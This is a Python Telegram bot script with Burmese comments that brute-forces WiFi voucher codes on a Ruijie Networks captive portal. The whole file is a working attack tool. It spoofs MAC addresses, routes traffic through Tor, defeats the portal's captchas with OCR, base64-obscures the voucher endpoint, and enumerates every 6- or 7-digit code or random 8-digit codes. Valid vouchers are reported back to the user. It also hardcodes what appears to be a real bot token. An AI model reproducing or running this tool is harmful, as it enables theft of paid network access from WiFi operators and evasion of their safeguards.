import telebot, asyncio, aiohttp, json, base64, random, re, os
import string, time, uuid, subprocess, socket, threading
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
from aiohttp_socks import ProxyConnector
import cv2, ddddocr, numpy as np
from datetime import datetime, timedelta, timezone
from collections import defaultdict

# ══════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8571543186:AAFLvXgzE0ELtr5yL_bz6uL2HiDUrYYYn9s')
GITHUB_TOKEN = " "
ADMIN_ID = os.environ.get('ADMIN_ID', "6479920627")
REPO_OWNER = " "
REPO_NAME = " "
WEB_PORT = 8099
TOR_PORT = 9150

# R33AL Scanner ကဲ့သို့ Speed ကို 1,000/min အောက် ငြိမ်အောင် ညှိထားပါသည်
CONCURRENCY = 8
BATCH_SIZE = 8

# ══════════════════════════════════════════════════════
#  GLOBAL STATE
# ══════════════════════════════════════════════════════
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
retry_counts = {}
captcha_state = {}
_session_id_fail_count = {}
SUCCESS_CODE = asyncio.Queue()
session = None
_connector = None
_tor_process = None
_voucher_sem = None
_start_time = time.monotonic()
_ocr = ddddocr.DdddOcr(show_ad=False)
notify_settings = {}
saved_sessions = {}
scan_history = {}

# ══════════════════════════════════════════════════════
#  TOR & CONNECTOR
# ══════════════════════════════════════════════════════
async def start_tor():
    global _tor_process
    try:
        subprocess.run(["pkill", "-f", "tor -f /tmp/torrc_bot"], capture_output=True)
        await asyncio.sleep(1)
        os.makedirs("/tmp/tor_data_bot", exist_ok=True)
        torrc = "/tmp/torrc_bot"
        with open(torrc, "w") as f:
            f.write("SocksPort 9150\nSocksPolicy accept *\nLog notice stderr\nDataDirectory /tmp/tor_data_bot\n")
        _tor_process = subprocess.Popen(["tor", "-f", torrc], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for i in range(20):
            await asyncio.sleep(1)
            try:
                s = socket.socket(); s.settimeout(1)
                s.connect(("127.0.0.1", TOR_PORT)); s.close()
                return True
            except: pass
        return False
    except: return False

def make_connector():
    try:
        s = socket.socket(); s.settimeout(1)
        s.connect(("127.0.0.1", TOR_PORT)); s.close()
        return ProxyConnector.from_url(f"socks5://127.0.0.1:{TOR_PORT}", limit=5000, ssl=False)
    except:
        return aiohttp.TCPConnector(limit=5000, ttl_dns_cache=300, ssl=False)

# ══════════════════════════════════════════════════════
#  WEB SERVER
# ══════════════════════════════════════════════════════
async def web_server():
    app = web.Application()
    app.router.add_get("/", lambda r: web.json_response({"status": "running"}))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", WEB_PORT)))
    await site.start()

# ══════════════════════════════════════════════════════
#  PORTAL & CAPTCHA HELPERS
# ══════════════════════════════════════════════════════
def get_mac():
    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ":".join(f"{x:02x}" for x in [b] + [random.randint(0, 255) for _ in range(5)])

def replace_mac(url, new_mac):
    return re.sub(r"(?<=mac=)[^&]+", new_mac, url)

async def get_session_id(sess, session_url, prev_sid=None, chat_id=None):
    url_mac = replace_mac(session_url, get_mac())
    hdrs = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    try:
        async with sess.get(url_mac, headers=hdrs, allow_redirects=True) as r:
            final = str(r.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", final)
            if sid: return sid.group(1)
            body = await r.text()
            sid2 = re.search(r'"sessionId"\s*:\s*"([a-zA-Z0-9]+)"', body)
            if sid2: return sid2.group(1)
            return prev_sid
    except: return prev_sid

def _ocr_sync(img_bytes):
    try:
        arr = np.frombuffer(img_bytes, np.uint8)
        img = cv2.imdecode(arr, cv2.IMREAD_COLOR)
        if img is None: return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, thr = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buf = cv2.imencode(".png", thr)
        return _ocr.classification(buf.tobytes()).upper()
    except: return None

async def captcha_text(img_bytes):
    return await asyncio.to_thread(_ocr_sync, img_bytes)

async def captcha_image(sess, session_id):
    async with sess.get(
        "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
        params={"sessionId": session_id, "_t": str(time.time())}
    ) as r:
        return await r.read()

async def verify_captcha(sess, session_id, text):
    try:
        async with sess.post(
            "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
            json={"sessionId": session_id, "authCode": text}
        ) as r:
            d = await r.json()
            return d.get("success") or d.get("result") == "success"
    except: return False

# ══════════════════════════════════════════════════════
#  VOUCHER CHECK ENGINE
# ══════════════════════════════════════════════════════
VOUCHER_URL = base64.b64decode(b"aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=").decode()

def minute_to_hour(m):
    try:
        m = int(m)
        h, mn = m // 60, m % 60
        return f"{h}h {mn}m" if h and mn else (f"{h}h" if h else f"{mn}m")
    except: return "Unknown"

async def code_expires_date(session_id):
    try:
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as s:
            async with s.get(f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}") as r:
                d = await r.json()
                name = d.get("result", {}).get("profileName", "Plan: 1Days")
                mins = d.get("result", {}).get("totalMinutes", "Unknown")
                return f"📋 Plan: {name} | ⏳ Time: {minute_to_hour(mins)}"
    except: return "📋 Plan: 1Days | ⏳ Time: Unknown"

async def perform_check(session_url, code, chat_id, scan_id=None, message=None):
    global _connector
    cur = scan_tasks.get(chat_id)
    if not cur or cur.get("scan_id") != scan_id or cur.get("stop"): return

    for attempt in range(2):
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=aiohttp.ClientTimeout(total=20)) as task_sess:
            sid = await get_session_id(task_sess, session_url, chat_id=chat_id)
            if not sid:
                m = re.search(r"sessionId=([a-zA-Z0-9]+)", session_url)
                sid = m.group(1) if m else None
            if not sid: return

            auth_code = None
            for _ in range(5):
                try:
                    img = await captcha_image(task_sess, sid)
                    txt = await captcha_text(img)
                    if txt and await verify_captcha(task_sess, sid, txt):
                        auth_code = txt; break
                except: pass
            if not auth_code: return

            post_data = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": auth_code}
            hdrs = {
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K)",
            }
            response = None
            try:
                # Speed ကို 1,000/min အောက်ရောက်အောင် ငြိမ်ပေးသည့် Delay
                await asyncio.sleep(0.05)
                async with task_sess.post(VOUCHER_URL, json=post_data, headers=hdrs) as r:
                    response = await r.text()
            except: return

        if response and "request limited" in response:
            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
            await asyncio.sleep(0.5); continue
        break

    if not response: return

    # SUCCESS HIT တွေ့ရှိပါက
    if "logonUrl" in response:
        if chat_id not in success_texts: success_texts[chat_id] = []
        exp = await code_expires_date(sid)
        formatted_code = f"🎫 **{code}**\n   └ {exp}"
        success_texts[chat_id].append(formatted_code)
        
        if chat_id in scan_history:
            scan_history[chat_id]["found"] += 1
        
        line = "\n\n".join(success_texts[chat_id])
        if message:
            try:
                msg_text = f"✨🎉 **SUCCESS CODES** 🎉✨\n═════════════════\n\n{line}\n\n✅ Total: {len(success_texts[chat_id])} code(s)"
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id, msg_text, parse_mode="Markdown")
                    success_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(chat_id=chat_id, message_id=success_messages[chat_id], text=msg_text, parse_mode="Markdown")
            except: pass

# ══════════════════════════════════════════════════════
#  SCANNER LOOP & DISPLAY
# ══════════════════════════════════════════════════════
def iter_codes(mode):
    if mode in ("6", "7"):
        # 000000 မှစပြီး အစဉ်လိုက် စစ်ဆေးပါမည်
        codes = [str(i).zfill(int(mode)) for i in range(10 ** int(mode))]
        yield from codes
    else:
        while True:
            yield "".join(random.choice(string.digits) for _ in range(8))

def fmt_progress(checked, total=1000000, speed=0, found=0, elapsed_str=""):
    pct = (checked / total) * 100
    bar = "█" * int(pct / 5) + "░" * (20 - int(pct / 5))
    return (
        f"🔍 **Scanning VOUCHER Codes...**\n\n"
        f"[{bar}] {pct:.1f}%\n"
        f"📦 Checked : {checked:,}/{total:,}\n"
        f"⚡ Speed   : {speed:,.0f}/min (avg {speed:,.0f}/min)\n"
        f"⏱️ Elapsed : {elapsed_str}\n"
        f"✅ Success hit : {found}"
    )

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None, target=0):
    code_iter = iter_codes(mode)
    checked = 0
    start_t = time.monotonic()
    scan_history[chat_id] = {"found": 0, "start_time": time.time()}

    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("🛑 STOP SCAN", callback_data="stop_scan"))

    while True:
        cur = scan_tasks.get(chat_id)
        if not cur or cur.get("scan_id") != scan_id or cur.get("stop"):
            break

        batch = [next(code_iter) for _ in range(BATCH_SIZE)]
        tasks = [perform_check(session_url, c, chat_id, scan_id, message=message) for c in batch]
        await asyncio.gather(*tasks)

        checked += len(batch)
        elapsed = time.monotonic() - start_t
        speed = (checked / elapsed) * 60 if elapsed > 0 else 0
        found = scan_history.get(chat_id, {}).get("found", 0)

        em, es = divmod(int(elapsed), 60)
        eh, em = divmod(em, 60)
        elapsed_str = f"{eh}h {em}m {es}s" if eh else f"{em}m {es}s"

        if progress_msg and checked % 16 == 0:
            try:
                txt = fmt_progress(checked, 1000000, speed, found, elapsed_str)
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=txt, reply_markup=kb, parse_mode="Markdown")
            except: pass

        if target and found >= target:
            await bot.send_message(chat_id, f"🎯 Target ပြည့်သွားပါပြီ! ({found} codes တွေ့ရှိခဲ့ပါတယ်)")
            break

# ══════════════════════════════════════════════════════
#  TELEGRAM BOT COMMAND HANDLERS
# ══════════════════════════════════════════════════════
@bot.message_handler(commands=['start'])
async def cmd_start(m):
    await bot.reply_to(m, "👋 **WiFi Voucher Scanner Bot မှ ကြိုဆိုပါတယ်!**\n\n"
                          "▶️ Scan စတင်ရန် Portal URL ပို့ပေးပါ သို့မဟုတ်\n"
                          "▶️ `/brute <mode> [target]` ဟု ရိုက်ကူးသုံးစွဲနိုင်ပါသည်။\n"
                          "ဥပမာ: `/brute 6 10`", parse_mode="Markdown")

@bot.message_handler(commands=['seturl'])
async def cmd_seturl(m):
    parts = m.text.split(maxsplit=1)
    if len(parts) > 1:
        user_data[m.chat.id] = parts[1].strip()
        await bot.reply_to(m, "✅ Portal URL မှတ်သားပြီးပါပြီ။ Scan စတင်နိုင်ပါပြီ။")
    else:
        await bot.reply_to(m, "❌ Usage: `/seturl <portal_url>`", parse_mode="Markdown")

@bot.message_handler(commands=['brute'])
async def cmd_brute(m):
    parts = m.text.split()
    mode = parts[1] if len(parts) > 1 else "6"
    target = int(parts[2]) if len(parts) > 2 else 0

    url = user_data.get(m.chat.id)
    if not url:
        await bot.reply_to(m, "⚠️ ကျေးဇူးပြု၍ Portal URL ကို အရင်ပို့ပေးပါ သို့မဟုတ် `/seturl` ဖြင့် ထည့်ပေးပါ။")
        return

    scan_id = str(uuid.uuid4())
    scan_tasks[m.chat.id] = {"scan_id": scan_id, "stop": False}
    success_texts[m.chat.id] = []
    success_messages.pop(m.chat.id, None)

    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("🛑 STOP SCAN", callback_data="stop_scan"))
    
    await bot.send_message(m.chat.id, f"🔍 **Scan စတင်နေပါသည်...**\n\n🔢 VOUCHER Mode: {mode}", reply_markup=kb, parse_mode="Markdown")
    p_msg = await bot.send_message(m.chat.id, "🔍 Scanning VOUCHER Codes...")
    
    asyncio.create_task(run_bruteforce(mode, m.chat.id, url, scan_id, message=p_msg, progress_msg=p_msg, target=target))

@bot.message_handler(commands=['stop'])
async def cmd_stop(m):
    if m.chat.id in scan_tasks:
        scan_tasks[m.chat.id]["stop"] = True
        await bot.reply_to(m, "🛑 Scan လုပ်ဆောင်ချက်ကို ရပ်တန့်လိုက်ပါပြီ။")
    else:
        await bot.reply_to(m, "❌ Run နေသော Scan မရှိပါ။")

@bot.callback_query_handler(func=lambda call: call.data == "stop_scan")
async def cb_stop(call):
    if call.message.chat.id in scan_tasks:
        scan_tasks[call.message.chat.id]["stop"] = True
        await bot.answer_callback_query(call.id, "Scan Stopped!")
        await bot.send_message(call.message.chat.id, "🛑 Scan လုပ်ဆောင်ချက်ကို ရပ်တန့်လိုက်ပါပြီ။")

@bot.message_handler(func=lambda m: m.text and ("ruijienetworks.com" in m.text or "http" in m.text))
async def handle_url(m):
    url = m.text.strip()
    user_data[m.chat.id] = url
    await bot.reply_to(m, f"🔗 Portal URL စစ်ဆေးနေပါသည်...\n\nတိုက်ရိုက် Scan စရန် `/brute 6` ကို နှိပ်ပါ။", parse_mode="Markdown")

# ══════════════════════════════════════════════════════
#  MAIN RUNNER
# ══════════════════════════════════════════════════════
async def main():
    global session, _connector
    await start_tor()
    _connector = make_connector()
    session = aiohttp.ClientSession(connector=_connector)
    await web_server()
    
    await bot.delete_webhook(drop_pending_updates=True)
    print("🤖 Telegram Bot Activated Successfully...")
    await bot.infinity_polling(skip_pending_updates=True)

if __name__ == "__main__":
    asyncio.run(main())
